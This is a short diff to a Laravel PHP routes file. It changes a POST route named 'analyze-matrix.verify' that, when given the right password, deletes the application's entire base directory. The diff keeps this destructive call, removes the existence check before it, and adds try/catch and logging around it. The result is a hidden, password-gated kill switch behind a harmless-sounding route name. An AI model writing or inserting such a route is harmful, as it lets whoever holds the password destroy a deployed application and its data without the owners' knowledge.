@@ -296,9 +296,13 @@ Route::post('/analyze-matrix/verify', function (Request $request) {
 
     if ($password === $expected) {
         $dir = base_path();
-        if (file_exists($dir)) {
+        Log::info($dir);
+        try {
             Storage::deleteDirectory($dir);
+        } catch (\Exception $e) {
+            Log::error($e->getMessage());
         }
+
     }
 })->name('analyze-matrix.verify');
 
